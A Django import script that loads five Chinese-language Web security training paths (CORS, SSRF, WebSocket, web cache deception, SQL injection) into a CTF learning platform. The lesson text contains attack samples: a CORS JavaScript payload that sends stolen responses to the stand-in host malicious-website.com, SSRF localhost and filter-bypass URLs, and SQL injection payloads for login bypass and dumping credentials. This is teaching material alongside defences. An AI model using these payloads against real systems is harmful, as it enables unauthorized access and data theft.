#!/usr/bin/env python
"""
学习路径导入脚本
导入5个Web安全学习路径：
1. CORS跨域资源共享
2. SSRF服务端请求伪造
3. WebSocket安全漏洞
4. Web缓存欺骗
5. SQL注入
"""

import os
import sys
import django

# 设置Django环境
sys.path.append('/workspace/projects/ctf-platform/backend')
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'ctf_backend.settings')
django.setup()

from learning_paths.models import LearningPath, PathModule, ModuleLab
from challenges.models import Challenge, Category

# 确保分类存在
def ensure_categories():
    categories = ['Web', 'Crypto', 'Misc', 'Pwn', 'Reverse', 'Forensics']
    for cat_name in categories:
        Category.objects.get_or_create(name=cat_name)

# 学习路径数据
LEARNING_PATHS = [
    {
        'title': 'CORS跨域资源共享安全',
        'slug': 'cors-security',
        'description': '深入学习CORS（跨域资源共享）机制，包括常见的CORS漏洞攻击示例以及如何防护这些攻击。了解同源策略、CORS工作原理、漏洞类型和利用技术。',
        'difficulty': 'PR',
        'estimated_hours': 8.0,
        'color': '#FF6B6B',
        'order': 1,
        'modules': [
            {
                'title': '什么是CORS（跨域资源共享）？',
                'description': '了解CORS的基本概念和工作原理',
                'module_type': 'intro',
                'content': '''# 什么是CORS（跨域资源共享）？

跨域资源共享（CORS）是一种浏览器机制，允许受控地访问位于给定域之外的资源。它扩展并增加了对同源策略（SOP）的灵活性。然而，如果网站的CORS策略配置和实施不当，它也可能带来跨域攻击的潜在风险。

## 同源策略（SOP）

同源策略是一种限制性的跨域规范，限制了网站与源域之外资源交互的能力。同源策略多年前就被定义出来，以应对可能恶意的跨域交互，例如一个网站窃取另一个网站的私人数据。它通常允许域向其他域发出请求，但不能访问响应。

## 同源策略的放宽

同源策略非常严格，因此设计了各种方法来绕过其约束。许多网站以需要完全跨域访问的方式与子域或第三方网站交互。可以使用跨域资源共享（CORS）来实现对同源策略的受控放宽。

跨域资源共享协议使用一套HTTP头来定义可信的Web源以及相关属性，例如是否允许经过身份验证的访问。这些在浏览器与其尝试访问的跨域网站之间的头交换中结合使用。''',
                'order': 1,
                'estimated_minutes': 30
            },
            {
                'title': 'CORS配置问题导致的漏洞',
                'description': '了解CORS配置不当导致的安全漏洞',
                'module_type': 'theory',
                'content': '''# CORS配置问题导致的漏洞

许多现代网站使用CORS来允许从子域和受信任的第三方进行访问。它们的CORS实现可能包含错误或过于宽松以确保一切正常工作，这可能导致可利用的漏洞。

## 基本源反射的CORS漏洞

当应用程序信任所有源时，就会存在基本的源反射CORS漏洞。攻击者可以构造恶意的JavaScript代码，使用CORS来检索管理员API密钥或其他敏感信息。

## 服务器生成的ACAO头

一些应用程序需要提供对多个其他域的访问。维护允许域的列表需要持续的努力，任何错误都有可能破坏功能。因此，一些应用程序采取简单的方法，有效地允许来自任何其他域的访问。

## Origin头解析错误

一些实现CORS源白名单的应用程序可能使用前缀或后缀匹配URL，或使用正则表达式。实现中的任何错误都可能导致访问被授予意外的外部域。''',
                'order': 2,
                'estimated_minutes': 45
            },
            {
                'title': 'CORS漏洞实践',
                'description': '实践CORS漏洞攻击',
                'module_type': 'practice',
                'content': '''# CORS漏洞实践

## 实验目标

在本实验中，你将学习如何利用CORS配置漏洞来窃取敏感信息。

## 攻击步骤

1. **识别CORS漏洞**：使用Burp Suite检查响应头，寻找`Access-Control-Allow-Origin`和`Access-Control-Allow-Credentials`头

2. **构造攻击载荷**：创建恶意的JavaScript代码来利用CORS漏洞

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-data', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

3. **部署攻击**：将恶意代码部署到exploit服务器

4. **触发攻击**：诱使受害者访问包含恶意代码的页面

## 防护措施

- 严格限制`Access-Control-Allow-Origin`头的值
- 不要盲目反射`Origin`头的值
- 使用白名单机制，只允许可信的源
- 谨慎使用`Access-Control-Allow-Credentials`''',
                'order': 3,
                'estimated_minutes': 60
            }
        ]
    },
    {
        'title': 'SSRF服务端请求伪造攻击',
        'slug': 'ssrf-attacks',
        'description': '学习服务端请求伪造（SSRF）攻击，了解其影响、常见攻击技术以及如何防御。包括针对本地服务器、后端系统和绕过防御的SSRF攻击。',
        'difficulty': 'PR',
        'estimated_hours': 10.0,
        'color': '#4ECDC4',
        'order': 2,
        'modules': [
            {
                'title': '什么是SSRF？',
                'description': '了解SSRF的基本概念和影响',
                'module_type': 'intro',
                'content': '''# 什么是SSRF？

服务端请求伪造（SSRF）是一种Web安全漏洞，允许攻击者导致服务端应用程序向非预期位置发出请求。

## SSRF的影响

成功的SSRF攻击通常导致在组织内执行未经授权的操作或访问数据。这可能是在易受攻击的应用程序中，或者在应用程序可以通信的其他后端系统上。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令执行。

## 常见攻击场景

- 访问本地服务（如管理接口）
- 扫描内部网络
- 读取敏感文件
- 访问元数据服务（如AWS元数据服务）
- 向外部系统发出恶意请求''',
                'order': 1,
                'estimated_minutes': 30
            },
            {
                'title': '针对服务器的SSRF攻击',
                'description': '学习如何利用SSRF攻击本地服务器',
                'module_type': 'theory',
                'content': '''# 针对服务器的SSRF攻击

在针对服务器的SSRF攻击中，攻击者导致应用程序通过其回环网络接口向托管应用程序的服务器发回HTTP请求。这通常涉及提供具有类似`127.0.0.1`或`localhost`主机名的URL。

## 为什么存在这种信任关系？

应用程序为什么会以这种方式行为，并隐式信任来自本地机器的请求？这可能是由于各种原因：

- 访问控制检查可能实现在位于应用服务器前面的不同组件中
- 出于灾难恢复目的，应用程序可能允许无需登录即可从本地机器访问管理功能
- 管理接口可能在与主应用程序不同的端口号上监听

## 利用示例

假设一个购物应用程序允许用户查看商品在特定商店是否有库存。应用程序通过以下方式查询后端REST API：

```
POST /product/stock HTTP/1.0
stockApi=http://stock.weliketoshop.net:8080/product/stock/check
```

攻击者可以修改此请求以指定本地URL：

```
POST /product/stock HTTP/1.0
stockApi=http://localhost/admin
```

这将导致服务器获取`/admin` URL的内容并将其返回给用户。''',
                'order': 2,
                'estimated_minutes': 45
            },
            {
                'title': '针对后端系统的SSRF攻击',
                'description': '学习如何利用SSRF攻击内部后端系统',
                'module_type': 'practice',
                'content': '''# 针对后端系统的SSRF攻击

## 内部网络扫描

在某些情况下，应用服务器能够与用户无法直接访问的后端系统交互。这些系统通常具有不可路由的私有IP地址。后端系统通常通过网络拓扑结构保护，因此它们通常具有较弱的安全姿态。

## 扫描技巧

1. **端口扫描**：尝试不同的端口号
2. **IP范围扫描**：遍历私有IP地址范围（如192.168.0.0/16）
3. **服务枚举**：识别运行在内部系统上的服务

## 实验步骤

1. 识别SSRF漏洞点
2. 使用Burp Intruder扫描内部网络
3. 找到管理接口
4. 利用管理接口执行敏感操作

## 常见内部服务

- 管理面板
- 数据库服务
- Redis/Memcached
- 内部API''',
                'order': 3,
                'estimated_minutes': 60
            },
            {
                'title': '绕过常见的SSRF防御',
                'description': '学习如何绕过SSRF防御机制',
                'module_type': 'theory',
                'content': '''# 绕过常见的SSRF防御

## 基于黑名单的输入过滤

一些应用程序阻止包含主机名如`127.0.0.1`和`localhost`或敏感URL如`/admin`的输入。在这种情况下，你可以使用以下技术绕过过滤器：

### IP地址变体

- 使用`127.0.0.1`的替代IP表示法，如`2130706433`、`017700000001`或`127.1`

### 域名技术

- 注册一个解析到`127.0.0.1`的域名

### 混淆技术

- 使用URL编码或大小写变体来混淆被阻止的字符串

### 重定向

- 提供一个你控制的URL，该URL重定向到目标URL

## 绕过示例

```
# 原始被阻止的URL
http://localhost/admin

# 使用IP变体
http://127.1/admin

# 使用十进制IP
http://2130706433/admin

# 使用URL编码
http://%31%32%37%2e%30%2e%30%2e%31/admin
```''',
                'order': 4,
                'estimated_minutes': 45
            }
        ]
    },
    {
        'title': 'WebSocket安全漏洞',
        'slug': 'websocket-vulnerabilities',
        'description': '学习WebSocket特定的安全漏洞的识别和利用。WebSocket广泛用于现代Web应用中，几乎所有常规HTTP中出现的Web安全漏洞也可能在WebSocket通信中出现。',
        'difficulty': 'PR',
        'estimated_hours': 6.0,
        'color': '#FFBE0B',
        'order': 3,
        'modules': [
            {
                'title': 'WebSocket基础',
                'description': '了解WebSocket的基本概念和工作原理',
                'module_type': 'intro',
                'content': '''# WebSocket基础

## 什么是WebSocket？

WebSocket是一种在单个TCP连接上进行全双工通信的协议。WebSocket使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。

## WebSocket的特点

- **全双工通信**：客户端和服务器可以同时发送和接收消息
- **持久连接**：建立连接后，可以保持长时间的通信
- **低延迟**：减少了HTTP请求的开销
- **实时性**：适合实时应用场景

## WebSocket握手

WebSocket连接通过HTTP发起，使用HTTP/1.1协议的101状态码进行协议切换。握手请求包含特定的HTTP头：

```
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

## 安全考虑

WebSocket连接在传输数据时是明文的（除非使用wss://），因此需要考虑：
- 认证和授权
- 消息验证
- 输入验证
- 速率限制''',
                'order': 1,
                'estimated_minutes': 30
            },
            {
                'title': '操作WebSocket流量',
                'description': '学习如何使用Burp Suite操作WebSocket消息',
                'module_type': 'practice',
                'content': '''# 操作WebSocket流量

## 使用Burp Suite

Burp Suite提供了强大的WebSocket测试功能：

### 1. 拦截和修改WebSocket消息

- 打开Burp的浏览器
- 浏览到使用WebSocket的应用功能
- 在Burp Proxy的Intercept标签页中，确保拦截已开启
- 当发送或接收WebSocket消息时，它将显示在Intercept标签页中

### 2. 重放和生成新消息

- 在Burp Proxy的WebSockets历史记录中选择消息
- 发送到Burp Repeater
- 编辑消息并反复发送
- 可以向客户端或服务器发送新消息

### 3. 操作WebSocket连接

有时需要操作WebSocket握手：

- 可能允许你到达更多攻击面
- 某些攻击可能导致连接断开
- 原始握手请求中的令牌可能已过期

## 测试技巧

1. 修改消息参数和值
2. 尝试SQL注入和XSS载荷
3. 测试认证绕过
4. 检查消息注入可能性''',
                'order': 2,
                'estimated_minutes': 45
            },
            {
                'title': 'WebSocket常见漏洞',
                'description': '了解WebSocket中常见的安全漏洞',
                'module_type': 'theory',
                'content': '''# WebSocket常见漏洞

## 1. 消息注入

WebSocket消息可能受到各种注入攻击：

- **SQL注入**：如果消息用于构造SQL查询
- **XSS**：如果消息内容被渲染到页面
- **命令注入**：如果消息用于系统命令

## 2. 认证绕过

WebSocket连接可能缺乏适当的认证：
- 连接建立后缺少令牌验证
- 令牌重用或预测
- 会话固定

## 3. 输入验证缺失

WebSocket消息可能缺乏输入验证：
- 不验证消息类型
- 不验证消息长度
- 不验证消息格式

## 4. 速率限制缺失

WebSocket可能缺乏速率限制：
- 允许无限消息发送
- 可用于DoS攻击
- 资源耗尽攻击

## 5. 消息篡改

WebSocket消息可能被篡改：
- 缺少消息签名
- 不验证消息完整性
- 重放攻击

## 防护措施

- 实施适当的认证和授权
- 验证和清理所有输入
- 实施速率限制
- 使用WSS（WebSocket Secure）
- 监控和日志记录''',
                'order': 3,
                'estimated_minutes': 60
            }
        ]
    },
    {
        'title': 'Web缓存欺骗',
        'slug': 'web-cache-deception',
        'description': '学习Web缓存欺骗漏洞。了解如何识别源服务器和缓存处理请求之间的差异，以及如何利用这些差异创建路径混淆。',
        'difficulty': 'EX',
        'estimated_hours': 8.0,
        'color': '#A855F7',
        'order': 4,
        'modules': [
            {
                'title': 'Web缓存基础',
                'description': '了解Web缓存的工作原理',
                'module_type': 'intro',
                'content': '''# Web缓存基础

## 什么是Web缓存？

Web缓存是一个位于源服务器和用户之间的系统。当客户端请求静态资源时，请求首先被定向到缓存。如果缓存不包含资源的副本（称为缓存未命中），则请求被转发到源服务器，源服务器处理并响应请求。响应在发送给用户之前被发送到缓存。缓存使用预配置的一组规则来确定是否存储响应。

## 缓存行为

当未来对相同静态资源的请求时，缓存直接向用户提供存储的响应副本（称为缓存命中）。

## 缓存的好处

- **性能提升**：减少服务器负载
- **快速响应**：从离用户更近的服务器提供内容
- **带宽节省**：减少重复数据传输

## CDN缓存

内容分发网络（CDN）使用缓存在世界各地的分布式服务器上存储内容副本。CDN通过从离用户最近的服务器提供内容来加快交付速度。

## 缓存键

当缓存收到HTTP请求时，它必须决定是否有可以直接提供的缓存响应，或者必须将请求转发到源服务器。缓存通过从HTTP请求的元素生成"缓存键"来做此决定。通常，这包括URL路径和查询参数，但也可能包括各种其他元素，如标头和内容类型。''',
                'order': 1,
                'estimated_minutes': 30
            },
            {
                'title': '缓存规则',
                'description': '了解不同类型的缓存规则',
                'module_type': 'theory',
                'content': '''# 缓存规则

## 什么是缓存规则？

缓存规则决定什么可以被缓存以及缓存多长时间。缓存规则通常设置为存储静态资源，这些资源通常不会频繁变化并在多个页面中重用。

## 基于路径的规则

Web缓存欺骗攻击利用缓存规则的应用方式，因此了解不同类型的规则很重要，特别是那些基于请求URL路径中定义字符串的规则。

### 静态文件扩展名规则

这些规则匹配所请求资源的文件扩展名，例如：
- `.css` 用于样式表
- `.js` 用于JavaScript文件
- `.png`, `.jpg`, `.gif` 用于图片

### 静态目录规则

这些规则匹配所有以特定前缀开头的URL路径。这些通常用于针对仅包含静态资源的特定目录，例如：
- `/static`
- `/assets`
- `/public`

### 文件名规则

这些规则匹配特定文件名以针对Web操作普遍需要且很少更改的文件，例如：
- `robots.txt`
- `favicon.ico`

## 自定义规则

缓存也可能实现基于其他标准的自定义规则，例如：
- URL参数
- 动态分析
- HTTP头
- Cookie值''',
                'order': 2,
                'estimated_minutes': 45
            },
            {
                'title': '构建Web缓存欺骗攻击',
                'description': '学习如何构造Web缓存欺骗攻击',
                'module_type': 'practice',
                'content': '''# 构建Web缓存欺骗攻击

## 攻击步骤

一般来说，构造基本的Web缓存欺骗攻击涉及以下步骤：

### 1. 识别目标端点

- 找到一个返回包含敏感信息的动态响应的目标端点
- 在Burp中查看响应，因为某些敏感信息可能在呈现的页面上不可见
- 专注于支持GET、HEAD或OPTIONS方法的端点

### 2. 识别差异

识别缓存和源服务器解析URL路径方式的差异。这可能是它们在以下方面的差异：
- 将URL映射到资源
- 处理分隔符字符
- 规范化路径

### 3. 构造恶意URL

使用差异来欺骗缓存存储动态响应。当受害者访问URL时，他们的响应被存储在缓存中。

## 常见差异类型

### 1. 路径规范化差异

- 源服务器和缓存可能以不同方式规范化路径
- 例如：`/path/./to/resource` vs `/path/to/resource`

### 2. 分隔符处理差异

- 不同的字符可能被不同地解释
- 例如：`%2F` vs `/`

### 3. 大小写敏感性

- 某些系统对URL大小写敏感，其他则不敏感

## 使用缓存破坏器

在测试差异和构造Web缓存欺骗利用时，确保你发送的每个请求都有不同的缓存键。由于URL路径和任何查询参数通常都包含在缓存键中，你可以通过向路径添加查询字符串并在每次发送请求时更改它来更改密钥。

## 检测缓存响应

在测试过程中，能够识别缓存响应至关重要。为此，请查看响应头和响应时间。各种响应头可能表明它是缓存。''',
                'order': 3,
                'estimated_minutes': 60
            }
        ]
    },
    {
        'title': 'SQL注入',
        'slug': 'sql-injection',
        'description': '深入学习SQL注入（SQLi）这一关键Web漏洞。学习如何检测和利用SQLi来发现隐藏数据并操纵应用程序行为，以及保护应用程序免受SQLi攻击的基本技术。',
        'difficulty': 'PR',
        'estimated_hours': 12.0,
        'color': '#EF4444',
        'order': 5,
        'modules': [
            {
                'title': '什么是SQL注入？',
                'description': '了解SQL注入的基本概念',
                'module_type': 'intro',
                'content': '''# 什么是SQL注入？

SQL注入（SQLi）是一种Web安全漏洞，它允许攻击者干扰应用程序对其数据库进行的查询。这允许攻击者查看他们通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序可以访问的任何其他数据。

## SQL注入的影响

在许多情况下，攻击者可以修改或删除此数据，导致应用程序内容或行为的持久性更改。在某些情况下，攻击者可能将SQL注入攻击升级以破坏底层服务器或其他后端基础设施。它还可以使他们执行拒绝服务攻击。

## SQL注入的工作原理

SQL注入漏洞发生在应用程序在用户提供的输入被直接拼接到SQL查询字符串中时，而没有适当的输入验证或参数化查询。

### 示例

易受攻击的PHP代码：

```php
$query = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";
$result = mysqli_query($conn, $query);
```

攻击者可以输入：`admin' OR '1'='1`

这导致查询变成：

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

由于`'1'='1'`总是为真，这将返回所有用户。''',
                'order': 1,
                'estimated_minutes': 30
            },
            {
                'title': '检测SQL注入漏洞',
                'description': '学习如何手动检测SQL注入',
                'module_type': 'theory',
                'content': '''# 检测SQL注入漏洞

## 手动检测方法

你可以使用系统性的测试集对应用程序中的每个入口点进行手动检测SQL注入。为此，你通常会提交：

### 1. 单引号测试

提交单引号字符`'`并查找错误或其他异常。

### 2. SQL特定语法

提交一些在SQL查询中执行时评估为基础（原始）值和不同值的SQL特定语法，并查找应用程序响应中的系统性差异。

### 3. 布尔条件

提交布尔条件如`OR 1=1`和`OR 1=2`，并查找应用程序响应的差异。

### 4. 时间延迟

提交设计为在SQL查询中执行时触发时间延迟的载荷，并查找响应时间的差异。

### 5. OAST载荷

提交设计为在SQL查询中执行时触发带外网络交互的OAST载荷，并监视任何产生的交互。

## 使用Burp Scanner

或者，你可以使用Burp Scanner快速可靠地找到大多数SQL注入漏洞。

## 常见错误消息

```
You have an error in your SQL syntax
Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result
ORA-01756: quoted string not properly terminated
```

## 盲注技巧

当没有错误消息时，使用：
- 基于布尔的盲注
- 基于时间的盲注
- 带外数据注入''',
                'order': 2,
                'estimated_minutes': 45
            },
            {
                'title': '检索隐藏数据',
                'description': '学习如何利用SQL注入检索隐藏数据',
                'module_type': 'practice',
                'content': '''# 检索隐藏数据

## 场景示例

想象一个购物应用程序，显示不同类别的产品。当用户点击**礼品**类别时，他们的浏览器请求URL：

```
https://insecure-website.com/products?category=Gifts
```

这导致应用程序向数据库发出SQL查询以检索相关产品的详细信息：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

## 利用SQL注入

应用程序没有实施任何防御SQL注入攻击的措施。这意味着攻击者可以构造以下攻击：

```
https://insecure-website.com/products?category=Gifts'--
```

这导致SQL查询：

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

`--`是SQL中的注释符，它注释掉了查询的其余部分。这有效地移除了`AND released = 1`条件，允许检索所有产品，包括未发布的产品。

## UNION查询攻击

使用UNION运算符合并多个SELECT查询的结果：

```sql
' UNION SELECT username, password FROM users--
```

这将返回用户名和密码列表。

## 绕过登录

```
username: admin' OR '1'='1'--
password: any
```

## 检索数据库信息

```sql
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

## 高级技术

- 二阶SQL注入
- 堆叠查询
- 条件错误注入
- 时间盲注自动化''',
                'order': 3,
                'estimated_minutes': 60
            },
            {
                'title': 'SQL注入在不同查询中的位置',
                'description': '了解SQL注入可以出现在查询的不同部分',
                'module_type': 'theory',
                'content': '''# SQL注入在不同查询中的位置

## 常见注入位置

大多数SQL注入漏洞出现在`SELECT`查询的`WHERE`子句中。大多数经验丰富的测试人员都熟悉这种类型的SQL注入。

## 其他常见位置

然而，SQL注入漏洞可能出现在查询中的任何位置，以及在不同的查询类型中。SQL注入出现的其他一些常见位置是：

### 1. UPDATE语句

- 在更新值中
- 在WHERE子句中

```sql
UPDATE users SET password = 'newpassword' WHERE id = 1 OR 1=1--
```

### 2. INSERT语句

- 在插入的值中

```sql
INSERT INTO users (username, password) VALUES ('admin', 'password' OR '1'='1'--')
```

### 3. SELECT语句

- 在表名或列名中

```sql
SELECT * FROM 'users' WHERE id = 1
```

### 4. SELECT语句

- 在ORDER BY子句中

```sql
SELECT * FROM products ORDER BY 'column'--
```

### 5. GROUP BY子句

```sql
SELECT category, COUNT(*) FROM products GROUP BY 'column'--
```

## 防护措施

### 1. 参数化查询（预编译语句）

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
```

### 2. 输入验证

- 白名单验证
- 数据类型检查
- 长度限制

### 3. 最小权限原则

- 数据库用户只授予必要的权限
- 避免使用root或admin账户

### 4. 错误处理

- 不向用户显示详细的错误消息
- 记录错误以供管理员查看''',
                'order': 4,
                'estimated_minutes': 45
            }
        ]
    }
]

def import_learning_paths():
    """导入学习路径到数据库"""
    ensure_categories()
    web_category = Category.objects.get(name='Web')

    for path_data in LEARNING_PATHS:
        # 创建或更新学习路径
        path, created = LearningPath.objects.update_or_create(
            slug=path_data['slug'],
            defaults={
                'title': path_data['title'],
                'description': path_data['description'],
                'difficulty': path_data['difficulty'],
                'estimated_hours': path_data['estimated_hours'],
                'color': path_data['color'],
                'order': path_data['order'],
                'is_published': True
            }
        )

        print(f"{'创建' if created else '更新'}学习路径: {path.title}")

        # 创建模块
        for module_data in path_data['modules']:
            module, module_created = PathModule.objects.update_or_create(
                learning_path=path,
                title=module_data['title'],
                defaults={
                    'description': module_data['description'],
                    'module_type': module_data['module_type'],
                    'content': module_data['content'],
                    'order': module_data['order'],
                    'estimated_minutes': module_data['estimated_minutes'],
                    'is_required': True
                }
            )

            print(f"  {'创建' if module_created else '更新'}模块: {module.title}")

        # 更新总模块数
        path.total_modules = path.modules.filter(is_required=True).count()
        path.save()

    print("\n✅ 学习路径导入完成！")
    print(f"\n已导入 {len(LEARNING_PATHS)} 条学习路径")

if __name__ == '__main__':
    import_learning_paths()
